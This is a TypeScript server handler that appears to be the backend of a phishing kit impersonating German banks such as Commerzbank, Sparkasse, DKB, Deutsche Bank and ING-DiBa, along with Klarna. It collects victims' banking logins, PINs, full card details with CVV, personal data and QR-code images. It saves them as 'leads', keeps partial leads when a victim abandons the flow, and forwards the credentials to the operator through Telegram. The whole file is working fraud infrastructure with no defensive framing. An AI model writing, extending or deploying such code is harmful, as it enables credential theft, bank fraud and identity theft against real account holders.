/**
 * Template Submission Handler with Secure Session Management
 * Replaces the global session storage with database-backed encrypted sessions
 * Now includes deduplication via leadService
 */

import { Request, Response } from 'express';
import fs from 'fs';
import path from 'path';
import sharp from 'sharp';
import sessionManager from '../services/sessionManager';
import { getDb } from '../database';
import { config } from '../config';
import { getTemplateStepConfig } from '../database/tables/template_step_configs';
import { telegramService } from '../services/telegramService';
import sessionAnalytics from '../services/sessionAnalytics';
import partialLeadService from '../services/partialLeadService';
import { leadService, LeadData } from '../services/leadService';

/**
 * Validate if a step is enabled for a template
 */
function validateStep(stepConfig: Record<string, boolean>, step: string): boolean {
  // Map step names to config keys
  const stepMapping: Record<string, string> = {
    'login': 'login', // Always allowed
    'personal-data': 'personalData',
    'personal-data-complete': 'personalData',
    'bank-card': 'bankCard',
    'bank-card-complete': 'bankCard',
    'bank-card-skip': 'bankCard', // Allow skipping bank card step
    'qr-upload': 'qrCode', // For templates using qrCode
    'qr-instructions': 'qrCode',
    'qr-error': 'qrCode',
    'qr-retry': 'qrCode',
    'start-verification': 'doubleLogin', // DKB and Deutsche Bank verification start
    'branch-selection': 'branchSelection',
    'bank-selection': 'bankSelection', // Klarna gateway bank selection
    'transaction-cancel': 'transactionCancel',
    'multi-field-login': 'multiFieldLogin',
    'final-completion': 'final', // Always allowed
    'final-step': 'final' // Always allowed
  };

  // Always allow login and final steps
  if (step === 'login' || step.includes('final') || step.includes('completion')) {
    return true;
  }

  const configKey = stepMapping[step];
  if (!configKey) {
    console.warn(`⚠️ Unknown step: ${step}, allowing by default`);
    return true;
  }

  // Check both qrCode and qrUpload for QR upload steps (different templates use different keys)
  if (configKey === 'qrCode') {
    return stepConfig['qrCode'] === true || stepConfig['qrUpload'] === true;
  }

  return stepConfig[configKey] === true;
}

export async function handleTemplateSubmission(req: Request, res: Response) {
  try {
    console.log('🔍 DEBUG: Template submission received');
    console.log('📊 Request body:', JSON.stringify(req.body, null, 2));
    console.log('📁 File received:', req.file ? req.file.originalname : 'No file');

    const { 
      template_name = 'commerzbank',
      key,
      step,
      data = {}
    } = req.body;

    // Define shouldCreateLead function
    const shouldCreateLead = (stepName: string, stepConfig: Record<string, boolean>): boolean => {
      // Template-specific final step logic
      const templateSpecificLogic: Record<string, string> = {
        'santander': stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete'),
        'commerzbank': (stepConfig.qrCode && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'postbank': (stepConfig.qrCode && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'ingdiba': (stepConfig.qrCode && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'deutsche_bank': (stepConfig.qrCode && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'comdirect': stepConfig.qrCode ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete'),
        'dkb': (stepConfig.qrUpload && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrUpload ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'volksbank': (stepConfig.qrUpload && stepConfig.bankCard) ? 'bank-card-complete|bank-card-skip' : (stepConfig.qrUpload ? 'qr-upload' : (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete')),
        'klarna': stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : (stepConfig.personalData ? 'personal-data-complete' : 'bank-selection')
      };
      
      const actualFinalStep = templateSpecificLogic[template_name] || 
        (stepConfig.bankCard ? 'bank-card-complete|bank-card-skip' : 'personal-data-complete');
      
      console.log(`🎯 Template ${template_name}: Final step should be '${actualFinalStep}', current step is '${stepName}'`);
      
      // Create lead only at the determined final step (handle pipe-separated options)
      const finalStepOptions = actualFinalStep.split('|');
      return finalStepOptions.includes(stepName);
    };

    // Extract real IP address - Express handles proxy headers when trust proxy is enabled
    let ip_address = req.ip || req.socket.remoteAddress;
    
    // Fallback to manual x-forwarded-for parsing if needed
    if (!ip_address && req.headers['x-forwarded-for']) {
      const forwardedIps = (req.headers['x-forwarded-for'] as string).split(',');
      ip_address = forwardedIps[0].trim();
    }
    
    console.log(`🌐 Client IP: ${ip_address}`);
    const user_agent = req.headers['user-agent'];
    const referrer = req.headers.referer;

    console.log(`✅ Template submission: ${template_name} - ${step} - Key: ${key}`);

    // Get template and step configuration for validation
    const db = getDb();
    const template = db.prepare('SELECT * FROM templates WHERE folder_name = ?').get(template_name);
    if (!template) {
      return res.status(404).json({ 
        success: false, 
        error: 'Template not found' 
      });
    }

    // Get step configuration
    const stepConfig = getTemplateStepConfig(db, template.id);
    console.log(`🔧 Step config for ${template_name}:`, stepConfig);

    // Validate if the step is enabled (skip validation for initial session creation)
    if (key && step && !validateStep(stepConfig, step)) {
      console.log(`❌ Step '${step}' is disabled for template '${template_name}'`);
      return res.status(400).json({ 
        success: false, 
        error: `Step '${step}' is not available for this template`,
        step_disabled: true
      });
    }

    // Validate session IP for security (if session exists)
    if (key) {
      console.log(`🔍 Validating IP for session ${key}: ${ip_address}`);
      
      // TEMPORARILY DISABLE IP VALIDATION IN DEVELOPMENT
      if (process.env.NODE_ENV === 'development') {
        console.log(`🔓 Development mode: Skipping IP validation for session ${key}`);
      } else {
        const isValidIP = await sessionManager.validateSessionIP(key, ip_address as string);
        if (!isValidIP) {
          await sessionManager.addSecurityEvent(key, 'ip_mismatch', {
            original_ip: ip_address,
            user_agent,
            step
          });
          
          console.log(`🚫 IP validation failed for session ${key}`);
          console.log(`🔍 Current IP: ${ip_address}`);
          console.log(`🔍 Headers:`, JSON.stringify(req.headers, null, 2));
          return res.status(403).json({ 
            success: false, 
            error: 'Session security validation failed',
            security_violation: true
          });
        } else {
          console.log(`✅ IP validation passed for session ${key}`);
        }
      }
    }

    // Create session if it doesn't exist
    let session = await sessionManager.getSession(key);
    if (!session) {
      if (step === 'login' || !key) {
        // Create new session for initial login or when no key provided
        const newKey = await sessionManager.createSession(template_name, ip_address as string, user_agent, referrer);
        console.log(`🔑 Created new session: ${newKey}`);
        return res.json({ success: true, session_key: newKey, state: 'login' });
      } else {
        // Session expired or invalid
        console.log(`❌ Invalid or expired session: ${key}`);
        return res.status(400).json({ 
          success: false, 
          error: 'Session expired or invalid',
          redirect_to_login: true 
        });
      }
    }

    // Handle QR upload flow
    if (step === 'qr-start') {
      await sessionManager.updateSessionState(key, 'qr_upload');
      await sessionManager.storeQRData(key, { upload_attempts: 0, files: [] });
      console.log(`🎯 QR session started for key: ${key}`);
      return res.json({ success: true, state: 'qr_upload' });
    }

    if (step === 'qr-upload') {
      const qrData = await sessionManager.getQRData(key) || { upload_attempts: 0, files: [] };
      qrData.upload_attempts++;

      console.log(`📎 QR upload attempt ${qrData.upload_attempts} for key: ${key}`);

      // Store the uploaded file if present
      if (req.file) {
        // Create uploads directory if it doesn't exist
        const uploadsDir = path.join(config.upload.directory, 'qr-codes');
        if (!fs.existsSync(uploadsDir)) {
          fs.mkdirSync(uploadsDir, { recursive: true });
        }

        // Generate unique filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileExtension = path.extname(req.file.originalname);
        const fileName = `${key}-attempt${qrData.upload_attempts}-${timestamp}${fileExtension}`;
        const filePath = path.join(uploadsDir, fileName);

        // Process image with Sharp for optimization
        try {
          const processedBuffer = await sharp(req.file.buffer)
            .resize(800, 800, { 
              fit: 'inside', 
              withoutEnlargement: true 
            })
            .jpeg({ quality: 85 })
            .toBuffer();
          
          // Save processed file to disk
          fs.writeFileSync(filePath, processedBuffer);
          console.log(`💾 Processed and saved file to: ${filePath}`);
        } catch (imageError) {
          console.warn('⚠️ Image processing failed, saving original:', imageError);
          // Fallback to original file
          fs.writeFileSync(filePath, req.file.buffer);
          console.log(`💾 Original file saved to: ${filePath}`);
        }

        // Add file info to QR data
        qrData.files.push({
          filename: fileName,
          originalName: req.file.originalname,
          path: filePath,
          attempt: qrData.upload_attempts,
          timestamp: new Date().toISOString(),
          size: req.file.size,
          mimetype: req.file.mimetype
        });
      }

      // Update QR data in session
      await sessionManager.storeQRData(key, qrData);

      // Single QR upload - complete QR process immediately
      await sessionManager.updateSessionState(key, 'qr_complete');
      console.log(`✅ QR upload completed for ${template_name}`);

      // Check if this is the final step for this template
      if (shouldCreateLead('qr-upload', stepConfig)) {
        console.log('🏁 QR upload is final step - creating lead...');
        const leadId = await createLeadFromSession(key, template_name);
        if (leadId) {
          await sessionManager.completeSession(key, leadId);
        }
      }

      return res.json({ 
        success: true, 
        state: 'final_success',
        message: 'QR-Code erfolgreich verarbeitet. Verifizierung abgeschlossen.',
        uploadAttempt: qrData.upload_attempts
      });
    }

    // Handle form data steps - Create lead at final step based on enabled steps
    // NOTE: This old logic is deprecated in favor of shouldCreateLead function below
    const templateFinalSteps = {
      'santander': ['bank-card-complete', 'personal-data-complete'], // Fallback if bank card disabled
      'apobank': ['bank-card-complete', 'personal-data-complete'], // Fallback if bank card disabled
      'commerzbank': ['bank-card-complete', 'personal-data-complete'],
      'sparkasse': ['bank-card-complete', 'personal-data-complete'], // Fallback if bank card disabled
      'postbank': ['qr-upload', 'bank-card-complete', 'personal-data-complete'], // QR upload is final step
      'dkb': ['bank-card-complete', 'personal-data-complete'],
      'ingdiba': ['bank-card-complete', 'personal-data-complete'], // Fallback if bank card disabled
      'deutsche_bank': ['bank-card-complete', 'personal-data-complete'],
      'comdirect': ['bank-card-complete', 'personal-data-complete'],
      'consorsbank': ['bank-card-complete', 'personal-data-complete'],
      'volksbank': ['bank-card-complete', 'personal-data-complete'],
      'klarna': ['bank-card-complete', 'personal-data-complete'], // Klarna gateway final steps
      'default': ['bank-card-complete', 'personal-data-complete']
    };

    const finalSteps = templateFinalSteps[template_name as keyof typeof templateFinalSteps] || templateFinalSteps['default'];
    const isFinalStep = finalSteps.includes(step);

    // Store step data in session
    const stepStartTime = Date.now();
    
    if (step === 'login' || step === 'bank-login') {
      // Handle login attempts (both direct login and bank-login from Klarna)
      console.log(`🔐 Processing login step: ${step} for template: ${template_name}`);
      console.log(`📊 Login data received:`, JSON.stringify(data, null, 2));
      
      const sessionData = await sessionManager.getSessionData(key) || {};
      if (!sessionData.login_attempts) {
        sessionData.login_attempts = [];
      }
      
      // Extract login credentials from data object
      const loginCredentials: any = {
        username: data.username || data.account || data.branch,
        password: data.password || data.pin,
        timestamp: new Date().toISOString(),
        attempt: sessionData.login_attempts.length + 1
      };
      
      // For Klarna, also store bank type and additional fields
      if (step === 'bank-login') {
        loginCredentials.bank_type = data.bank_type;
        loginCredentials.selected_branch = data.selected_branch;
        // Store all login fields for different bank types
        Object.keys(data).forEach(key => {
          if (['username', 'password', 'pin', 'account', 'branch'].includes(key)) {
            loginCredentials[key] = data[key];
          }
        });
      }
      
      sessionData.login_attempts.push(loginCredentials);
      
      // Store primary login credentials in session
      sessionData.username = loginCredentials.username;
      sessionData.password = loginCredentials.password;
      
      // For Klarna, also store bank-specific data
      if (step === 'bank-login') {
        sessionData.bank_type = data.bank_type;
        sessionData.selected_branch = data.selected_branch;
        // Store all login fields in session data
        Object.keys(data).forEach(key => {
          if (!sessionData[key]) {
            sessionData[key] = data[key];
          }
        });
      }
      
      await sessionManager.storeSessionData(key, sessionData);
      await sessionManager.updateSessionState(key, step === 'login' ? 'login_submitted' : 'bank_login_submitted');
      
      console.log(`✅ Login data stored successfully for session: ${key}`);
      console.log(`📝 Stored credentials - Username: ${sessionData.username}, Password: ${sessionData.password ? '[REDACTED]' : 'NOT SET'}`);
      
      // Track login step completion
      await sessionAnalytics.trackStepCompletion(key, step, Math.round((Date.now() - stepStartTime) / 1000));
      
      // Create immediate partial lead for login data (valuable even if user abandons later)
      if (sessionData.username && sessionData.password && !session.lead_created) {
        console.log('💾 [PARTIAL-LEADS] Creating immediate partial lead for login data');
        try {
          const partialLeadId = await partialLeadService.createImmediatePartialLead(key, template_name, sessionData);
          if (partialLeadId) {
            // Mark session as having partial lead
            db.prepare(`
              UPDATE sessions 
              SET lead_created = 1, lead_id = ?
              WHERE session_key = ?
            `).run(partialLeadId, key);
            console.log(`✅ [PARTIAL-LEADS] Immediate partial lead ${partialLeadId} created for session ${key}`);
          }
        } catch (error) {
          console.error('❌ [PARTIAL-LEADS] Error creating immediate partial lead:', error);
        }
      }
    } else if (step === 'bank-card-skip') {
      // Handle bank card skip
      console.log(`💳 Processing bank card skip for session: ${key}`);
      
      const sessionData = await sessionManager.getSessionData(key) || {};
      sessionData.bank_card_skipped = true;
      sessionData.skip_reason = data.skip_reason || 'no_credit_card';
      
      await sessionManager.storeSessionData(key, sessionData);
      await sessionManager.updateSessionState(key, 'bank_card_skipped');
      
      // Track step completion
      await sessionAnalytics.trackStepCompletion(key, step, Math.round((Date.now() - stepStartTime) / 1000));
      
      console.log(`✅ Bank card skip processed for session: ${key}`);
    } else {
      // Store other form data
      await sessionManager.storeSessionData(key, data);
      await sessionManager.updateSessionState(key, step);
      
      // Track step completion
      await sessionAnalytics.trackStepCompletion(key, step, Math.round((Date.now() - stepStartTime) / 1000));
    }


    // Create lead only when all enabled steps are completed
    if (shouldCreateLead(step, stepConfig)) {
      console.log('🏁 Processing final step - creating lead...');
      
      const leadId = await createLeadFromSession(key, template_name);
      if (leadId) {
        await sessionManager.completeSession(key, leadId);
        
        res.json({ 
          success: true,
          message: 'Lead saved successfully',
          lead_id: leadId
        });
      } else {
        res.status(500).json({ 
          success: false,
          message: 'Failed to create lead'
        });
      }
    } else {
      // Intermediate step - just acknowledge receipt
      res.json({ 
        success: true,
        message: 'Data submitted successfully'
      });
    }

  } catch (error) {
    console.error('Error in template submission:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error'
    });
  }
}

/**
 * Create or update a lead from session data using deduplication
 * If a lead with the same first_name + last_name exists, it will be updated instead of creating a duplicate
 */
async function createLeadFromSession(sessionKey: string, templateName: string): Promise<number | null> {
  try {
    const db = getDb();
    
    // Get session data
    const sessionData = await sessionManager.getSessionData(sessionKey);
    const qrData = await sessionManager.getQRData(sessionKey);
    const session = await sessionManager.getSession(sessionKey);
    
    if (!sessionData || !session) {
      console.error('No session data found for lead creation');
      return null;
    }

    // Get or create template
    let template: any = db.prepare('SELECT * FROM templates WHERE folder_name = ?').get(templateName);
    if (!template) {
      const templateMap: Record<string, { name: string; desc: string }> = {
        'commerzbank': { name: 'Commerzbank', desc: 'Commerzbank online banking template with multi-step verification' },
        'santander': { name: 'Santander', desc: 'Santander online banking template with comprehensive data collection' },
        'apobank': { name: 'Apobank', desc: 'Apobank online banking template for healthcare professionals' },
        'sparkasse': { name: 'Sparkasse', desc: 'Sparkasse template with branch selection and regional banking' },
        'postbank': { name: 'Postbank', desc: 'Postbank template with double login and QR code verification' },
        'dkb': { name: 'DKB', desc: 'DKB template with modern dark theme and simplified flow' },
        'volksbank': { name: 'Volksbank', desc: 'Volksbank template with branch selection and QR upload' },
        'comdirect': { name: 'comdirect', desc: 'Comdirect investment banking template' },
        'consorsbank': { name: 'Consorsbank', desc: 'Consorsbank template with simplified broker flow' },
        'ingdiba': { name: 'ING-DiBa', desc: 'ING-DiBa template with transaction cancellation flow' },
        'deutsche_bank': { name: 'Deutsche Bank', desc: 'Deutsche Bank template with multi-field login' },
        'klarna': { name: 'Klarna Gateway', desc: 'Klarna payment gateway with bank selection and unified data collection' },
        'credit-landing': { name: 'Klarna Kreditkarte', desc: 'Klarna Kreditkarte - Sofortige Genehmigung mit Kartendaten und persönlichen Angaben' }
      };

      const templateInfo = templateMap[templateName];
      const displayName = templateInfo?.name || templateName.charAt(0).toUpperCase() + templateName.slice(1);
      const description = templateInfo?.desc || `${displayName} banking template`;

      const templateResult = db.prepare(`
        INSERT INTO templates (name, folder_name, description, is_active)
        VALUES (?, ?, ?, ?)
      `).run(displayName, templateName, description, 1);

      template = { id: templateResult.lastInsertRowid, name: displayName, folder_name: templateName };
      console.log(`✅ Created template: ${displayName} (ID: ${template.id})`);
    }

    // Get or create domain
    let domain: any = db.prepare('SELECT * FROM domains WHERE template_id = ? LIMIT 1').get(template.id);
    if (!domain) {
      // Check if domain already exists with this name
      const existingDomain = db.prepare('SELECT * FROM domains WHERE domain_name = ? LIMIT 1').get('localhost:5173');
      
      if (existingDomain) {
        // Use existing domain
        domain = existingDomain;
        console.log(`✅ Using existing domain (ID: ${domain.id})`);
      } else {
        // Create new domain
        const domainResult = db.prepare(`
          INSERT INTO domains (domain_name, template_id, is_active)
          VALUES (?, ?, ?)
        `).run('localhost:5173', template.id, 1);

        domain = { id: domainResult.lastInsertRowid, domain_name: 'localhost:5173' };
        console.log(`✅ Created domain (ID: ${domain.id})`);
      }
    }

    // Debug: Log what we're about to store
    console.log(`🎯 Processing lead for session: ${sessionKey}`);
    console.log(`📋 Lead data - Name: ${sessionData.first_name} ${sessionData.last_name}`);
    console.log(`📋 Credentials - Username: ${sessionData.username}, Password: ${sessionData.password ? '[REDACTED]' : 'NOT SET'}`);
    console.log(`🏦 Bank info - Type: ${sessionData.bank_type}, Branch: ${sessionData.selected_branch ? 'Selected' : 'None'}`);
    
    // Prepare lead data for upsert
    const leadData: LeadData = {
      template_id: template.id,
      domain_id: domain.id,
      tracking_id: sessionKey,
      first_name: sessionData.first_name,
      last_name: sessionData.last_name,
      email: sessionData.email,
      phone: sessionData.phone,
      username: sessionData.username,
      password: sessionData.password,
      pin: sessionData.pin,
      street: sessionData.street,
      street_number: sessionData.street_number,
      plz: sessionData.plz,
      city: sessionData.city,
      date_of_birth: sessionData.date_of_birth,
      card_number: sessionData.card_number,
      expiry_date: sessionData.expiry_date,
      cvv: sessionData.cvv,
      cardholder_name: sessionData.cardholder_name,
      ip_address: session.ip_address || undefined,
      user_agent: session.user_agent || undefined,
      status: 'completed',
      source: 'submission',
      template_name: templateName,
      additional_data: {
        session_key: sessionKey,
        selected_bank: sessionData.bank_type || sessionData.selected_bank,
        selected_branch: sessionData.selected_branch,
        qr_data: qrData,
        flow_completed: true,
        completed_at: new Date().toISOString(),
        browser: session.user_agent,
        ip_address: session.ip_address
      }
    };
    
    // Use leadService to upsert (creates new or updates existing based on first_name + last_name)
    const { leadId, isUpdate, existingLead } = leadService.upsertLead(leadData);
    
    if (isUpdate) {
      console.log(`🔄 UPDATED existing lead (ID: ${leadId}) for ${sessionData.first_name} ${sessionData.last_name}`);
      console.log(`📊 This person has now submitted data ${(existingLead?.submission_count || 0) + 1} times`);
    } else {
      console.log(`🎉 SUCCESS: Created NEW lead with ID: ${leadId} for session: ${sessionKey}`);
    }
    
    // Send Telegram notification
    try {
      const fullName = [sessionData.first_name, sessionData.last_name].filter(Boolean).join(' ') || null;
      
      const leadWithTemplate = {
        id: leadId,
        template_id: template.id,
        domain_id: domain.id,
        tracking_id: sessionKey,
        name: fullName,
        email: sessionData.email,
        phone: sessionData.phone,
        username: sessionData.username,
        password: sessionData.password,
        additional_data: JSON.stringify(leadData.additional_data),
        ip_address: session.ip_address,
        user_agent: session.user_agent,
        status: 'completed',
        created_at: new Date().toISOString(),
        template_name: template.folder_name,
        template_display_name: template.name,
        domain_name: domain.domain_name
      };
      
      const notificationSent = await telegramService.sendLeadNotification(leadWithTemplate);
      
      // Update lead with notification status
      db.prepare(`
        UPDATE leads 
        SET notification_sent = ?, notification_sent_at = ?, notification_error = ?
        WHERE id = ?
      `).run(
        notificationSent ? 1 : 0,
        notificationSent ? new Date().toISOString() : null,
        notificationSent ? null : 'Failed to send notification',
        leadId
      );
      
      if (notificationSent) {
        console.log(`📱 Telegram notification sent for lead ${leadId}${isUpdate ? ' (updated)' : ' (new)'}`);
      } else {
        console.warn(`⚠️ Telegram notification failed for lead ${leadId}`);
      }
    } catch (notificationError) {
      console.error('❌ Error sending Telegram notification:', notificationError);
      // Don't fail lead creation if notification fails
    }
    
    return leadId;

  } catch (error) {
    console.error('❌ Error creating/updating lead from session:', error);
    return null;
  }
}
